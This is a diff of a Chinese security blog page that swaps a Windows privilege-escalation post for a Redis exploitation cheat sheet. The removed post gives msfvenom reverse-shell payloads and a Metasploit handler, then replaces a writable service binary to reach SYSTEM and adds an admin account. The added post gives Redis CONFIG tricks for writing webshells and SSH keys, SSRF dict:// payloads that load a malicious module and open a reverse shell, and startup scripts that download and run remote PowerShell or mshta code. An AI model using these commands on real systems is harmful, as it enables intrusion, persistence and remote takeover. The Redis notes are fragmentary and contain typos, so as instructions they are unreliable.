@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="记一次简单的win提权, Yang Hao&#39;s blog">
+    <meta name="keywords" content="Redis漏洞利用, Yang Hao&#39;s blog">
     <meta name="description" content="Yang Hao&#39;s blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>记一次简单的win提权 | Yang Hao&#39;s blog</title>
+    <title>Redis漏洞利用 | Yang Hao&#39;s blog</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://p.pstatp.com/origin/137500001acfaf08a0839')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a580adaef320997598f9963613ec00b3.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">记一次简单的win提权</h1>
+                    <h1 class="description center-align post-title">Redis漏洞利用</h1>
                 </div>
             </div>
         </div>
@@ -403,12 +403,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/windows%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/">
-                                <span class="chip bg-color">windows服务提权</span>
-                            </a>
-                        
-                            <a href="/tags/metasploit/">
-                                <span class="chip bg-color">metasploit</span>
+                            <a href="/tags/Redis-Getshell/">
+                                <span class="chip bg-color">Redis-Getshell</span>
                             </a>
                         
                     </div>
@@ -419,8 +415,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" class="post-category">
-                                网络攻防
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-category">
+                                漏洞利用
                             </a>
                         
                     </div>
@@ -432,28 +428,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-06
+                    2021-10-09
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-10-10
+                    2021-10-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    920
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    5 分
                 </div>
                 
 
@@ -468,42 +464,121 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。 </p>
-<h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>脚本内容如下：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 192.168.122.135
-set LPORT 443
-set ExitOnSession false
-set EnableStageEncoding true
-set EnableUnicodeEncoding true
-set AutoRunScript 'post/windows/manage/migrate' 
-run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p>
-<h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p>
-<p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p>
-<h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">use post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p>
-<p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p>
-<p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p>
-<h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">use post/windows/gather/enum_services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这种类似服务的文件进行权限限制同时任意用户可以对其服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code> cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p>
-<p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p>
-<pre class="line-numbers language-shell"><code class="language-shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"
-shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p>
-<p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p>
-<p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p>
-<h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p>
-<h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录Redis在Linux和Windwos下获取权限的方式。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Linux Docker / 官网安装包<br>Windows PHPStudy  / <a target="_blank" rel="noopener" href="https://github.com/dmajkic/redis/downloads">https://github.com/dmajkic/redis/downloads</a></p>
+<h2 id="Redis连接-管理工具"><a href="#Redis连接-管理工具" class="headerlink" title="Redis连接/管理工具"></a>Redis连接/管理工具</h2><p>链接工具<br>1.<a target="_blank" rel="noopener" href="https://redis.io/topics/rediscli">https://redis.io/topics/rediscli</a>  redis-cli,redis安装完成后自带(redis-cli和redis-cli.exe)<br>2.<a target="_blank" rel="noopener" href="https://github.com/caoxinyu/RedisClient">https://github.com/caoxinyu/RedisClient</a>   GUI客户端(好用)<br>3.redis-desktop-manager (可视化工具，新版本收费) <a target="_blank" rel="noopener" href="https://github.com/lloy1231/RedisDesktopManager-Windows">https://github.com/lloy1231/RedisDesktopManager-Windows</a><br>4.<a target="_blank" rel="noopener" href="https://github.com/qishibo/AnotherRedisDesktopManager">https://github.com/qishibo/AnotherRedisDesktopManager</a></p>
+<p>redis-cli.exe(D:\ActivePart\Script\Python\Scrapy\redis-2.4.5-win32-win64\32bit)</p>
+<pre class="line-numbers language-shell"><code class="language-shell">$ wget https://download.redis.io/releases/redis-6.0.9.tar.gz
+$ tar xzf redis-6.0.9.tar.gz
+$ cd redis-6.0.9
+$ make
+$ src/redis-cli
+redis> set foo bar
+OK
+redis> get foo
+"bar"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>redis-cli -h host -p port -a password ping<br>redis-cli -h redis15.localnet.org -p 6390 ping</p>
+<p>redis-cli&gt;connect 127.0.0.1 9999 链接到127.0.0.1:9999 redis </p>
+<h2 id="Redis常用命令"><a href="#Redis常用命令" class="headerlink" title="Redis常用命令"></a>Redis常用命令</h2><pre class="line-numbers language-mipsasm"><code class="language-mipsasm">#检测 redis 服务是否启动
+ping
+
+#查看是否设置了密码验证
+CONFIG get requirepass
+
+#设置密码为runoob
+AUTH "runoob"
+
+#获取 Redis 服务器的各种信息和统计数值
+INFO
+
+#查询配置参数
+CONFIG GET
+
+#设置配置参数
+CONFIG STE
+
+#设置KEY"runoobkey"的值为redis 
+SET runoobkey redis
+
+#删除KEY"runoobkey"
+DEL runoobkey
+
+#在后台异步保存当前数据库的数据到磁盘
+BGSAVE
+
+#返回当前数据库的 key 的数量
+DBSIZE
+
+#让 Redis 服务崩溃
+DEBUG SEGFAULT
+
+#删除所有数据库的所有key
+FLUSHALL
+
+#删除当前数据库的所有key
+FLUSHDB
+
+#返回最近一次 Redis 成功将数据保存到磁盘上的时间，以 UNIX 时间戳格式表示
+LASTSAVE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>核心的利用方式<br>1.备份文件</p>
+<pre class="line-numbers language-stata"><code class="language-stata"># redis写文件
+DBSIZE                   # 统计KEYS
+flushall                  # 如果键
+CONFIG GET slave-read-only      # 查询只读配置
+CONFIG SET slave-read-only no    # 关闭只读配置
+CONFIG GET DIR              # 查询目录
+CONFIG SET dir /path/www/html    # 修改备份目录  
+CONGIG SET dbfilename trojan.php  # 修改备份文件名为我们的shell名
+SET trojan "<?php phpinfo(); ?>"  #设置KEY和值
+BGSAVE                   # Redis Bgsave 命令用于在后台异步保存当前数据库的数据到磁盘。BGSAVE 命令执行之后立即返回 OK ，然后 Redis fork 出一个新子进程，原来的 Redis 进程(父进程)继续处理客户端请求，而子进程则负责将数据保存到磁盘，然后退出。
+DEL trojan                
+恢复：
+CONFIG SET dir /usr/local/redis  
+CONGIG SET dbfilename dump.rdb 
+
+# 写SSH公钥
+config set dir /root/.ssh
+config set dbfilename authorized_keys
+save
+
+
+
+set 1234 123
+key *
+get 1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.主从复制</p>
+<p>3.主从复制RCE , 扩展加载 MODULE LOAD<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113116872">https://zhuanlan.zhihu.com/p/113116872</a><br>docker search redis5.0    //查找镜像<br>docker pull damonevking/redis5.0   //拉取下图第三个镜像</p>
+<h3 id="不同环境下的权限获取"><a href="#不同环境下的权限获取" class="headerlink" title="不同环境下的权限获取"></a>不同环境下的权限获取</h3><p>Redis4.x-5.x主从RCE<br>Linux,&gt; xxx ,ROOT权限<br>写webshell(主从复制、备份文件写入)、写计划任务(主从复制、备份文件写入)、写公钥(主从复制、备份文件写入)、.so劫持(主从复制)、.so扩展(主从复制, redis&gt;xxx)</p>
+<p>Windows(Redis 高权限)<br>启动项目(主从复制、备份文件写入)，DLL劫持(主从复制)、MOF(C:/windows/system32/wbem/mof/nullevt.mof)、快捷方式（，需要知道用户名，需要目标一次点击）、</p>
+<p>使用dict协议-主从复制Getshell（Linux）：</p>
+<pre class="line-numbers language-vala"><code class="language-vala">#查看当前redis的相关配置
+ssrf.php?url=dict://192.168.200.97:6379/info
+#设置备份文件名
+ssrf.php?url=dict://192.168.200.97:6379/config:set:dbfilename:exp.so
+#连接恶意Redis服务器
+ssrf.php?url=dict://192.168.200.97:6379/slaveof:192.168.172.129:1234
+#加载恶意模块
+ssrf.php?url=dict://192.168.200.97:6379/module:load:./exp.so
+#切断主从复制
+ssrf.php?url=dict://192.168.200.97:6379/slaveof:no:one
+#执行系统命令
+ ssrf.php?url=dict://192.168.200.97:6379/system.rev:192.168.172.129:9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>主从复制：</p>
+<p>DLL劫持：</p>
+<p>HTTP协议走私GEtshell Redis</p>
+<h3 id="Redis-4-x-5-x-未授权访问漏洞"><a href="#Redis-4-x-5-x-未授权访问漏洞" class="headerlink" title="Redis 4.x/5.x 未授权访问漏洞"></a>Redis 4.x/5.x 未授权访问漏洞</h3><p>Redis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
+<p>http协议打redis（protocol smuggle的思考）</p>
+<h3 id="RedisWriteFile-windows主从复制的利用"><a href="#RedisWriteFile-windows主从复制的利用" class="headerlink" title="RedisWriteFile(windows主从复制的利用)"></a>RedisWriteFile(windows主从复制的利用)</h3><p>windows写DLL</p>
+<h3 id="Redis-load-so"><a href="#Redis-load-so" class="headerlink" title="Redis load so"></a>Redis load so</h3><h3 id="Weblogic-SSRF-攻击内网"><a href="#Weblogic-SSRF-攻击内网" class="headerlink" title="Weblogic SSRF 攻击内网"></a>Weblogic SSRF 攻击内网</h3><h3 id="攻击-Redis-SMB"><a href="#攻击-Redis-SMB" class="headerlink" title="攻击 Redis / SMB"></a>攻击 Redis / SMB</h3><p>mshta</p>
+<pre class="line-numbers language-cmd?linenums"><code class="language-cmd?linenums">config set dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"
+config set dbfilename shell.bat
+set x "\r\n\r\nmshta http://192.168.230.133:8080/shell\r\n\r\n"
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-podspec?linenums"><code class="language-podspec?linenums">config set dir "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"
+config set dbfilename shell.bat
+set x "\r\n\r\npowershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.230.133/shell.ps1');xx.ps1\"\r\n\r\n"
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nul1/p/12915304.html">https://www.cnblogs.com/nul1/p/12915304.html</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/36529010">https://zhuanlan.zhihu.com/p/36529010</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a><br><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -547,7 +622,7 @@ shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yanghaoi.github.io/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/">https://yanghaoi.github.io/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/</a>
+                    <a href="https://yanghaoi.github.io/2021/10/09/redis-lou-dong-li-yong/">https://yanghaoi.github.io/2021/10/09/redis-lou-dong-li-yong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -585,12 +660,8 @@ shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><s
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/windows%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/">
-                                    <span class="chip bg-color">windows服务提权</span>
-                                </a>
-                            
-                                <a href="/tags/metasploit/">
-                                    <span class="chip bg-color">metasploit</span>
+                                <a href="/tags/Redis-Getshell/">
+                                    <span class="chip bg-color">Redis-Getshell</span>
                                 </a>
                             
                         </div>
@@ -895,53 +966,47 @@ shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><s
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/10/09/cve-2020-1313-fu-xian/">
+                <a href="/2021/10/09/redis-lou-dong-li-yong/">
                     <div class="card-image">
                         
-                        <img src="https://p.pstatp.com/origin/137500001acfaf08a0839" class="responsive-img" alt="CVE-2020-1313复现">
+                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a580adaef320997598f9963613ec00b3.png" class="responsive-img" alt="Redis漏洞利用">
                         
-                        <span class="card-title">CVE-2020-1313复现</span>
+                        <span class="card-title">Redis漏洞利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Windows Update Orchestrator Service 存在无需认证的API接口，利用接口可在注册表项中添加将以SYSTEM权限运行的计划任务，从而获得权限提升(CVE-2020-1313)。
+                            描述
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    漏洞复现
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-category">
+                                    漏洞利用
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
-                        <span class="chip bg-color">权限提升</span>
-                    </a>
-                    
-                    <a href="/tags/Windows-10/">
-                        <span class="chip bg-color">Windows 10</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2020-1313/">
-                        <span class="chip bg-color">CVE-2020-1313</span>
+                    <a href="/tags/Redis-Getshell/">
+                        <span class="chip bg-color">Redis-Getshell</span>
                     </a>
                     
                 </div>
@@ -955,30 +1020,30 @@ shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><s
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/30/jian-dan-de-yuan-ma-mian-sha/">
+                <a href="/2021/10/07/ssrf-lou-dong-ji-chu/">
                     <div class="card-image">
                         
-                        <img src="https://p.pstatp.com/origin/137500001acfaf08a0839" class="responsive-img" alt="简单的源码免杀">
+                        <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8e747a43120a59986fdbc8840ff6f6f1.jpg" class="responsive-img" alt="SSRF漏洞基础">
                         
-                        <span class="card-title">简单的源码免杀</span>
+                        <span class="card-title">SSRF漏洞基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。
+                            对SSRF漏洞的类型、原理、协议使用、限制绕过、攻击其他组件、常用的利用工具和方法等进行记录。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-07
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" class="post-category">
-                                    网络攻防
+                            <a href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    基础漏洞
                                 </a>
                             
                             
@@ -988,16 +1053,8 @@ shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/msfvenom%E5%85%8D%E6%9D%80/">
-                        <span class="chip bg-color">msfvenom免杀</span>
-                    </a>
-                    
-                    <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/">
-                        <span class="chip bg-color">C语言免杀</span>
-                    </a>
-                    
-                    <a href="/tags/%E9%9A%90%E8%97%8F%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3/">
-                        <span class="chip bg-color">隐藏程序窗口</span>
+                    <a href="/tags/SSRF%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">SSRF漏洞</span>
                     </a>
                     
                 </div>
